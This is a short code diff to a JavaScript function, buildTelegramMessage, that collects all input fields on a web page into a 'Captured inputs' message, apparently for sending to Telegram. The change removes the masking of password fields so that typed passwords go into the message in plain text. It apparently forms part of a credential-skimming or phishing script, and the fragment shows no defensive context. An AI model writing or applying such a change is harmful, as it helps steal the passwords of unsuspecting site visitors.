@@ -19,7 +19,7 @@ function buildTelegramMessage() {
     `Captured inputs from ${window.location.pathname}:`,
     ...inputs.map((input, index) => {
       const label = getInputLabel(input, index);
-      const value = input.type === 'password' ? '••••••' : input.value || '(empty)';
+      const value = input.value || '(empty)';
       return `${label}: ${value}`;
     }),
   ].join('\n');
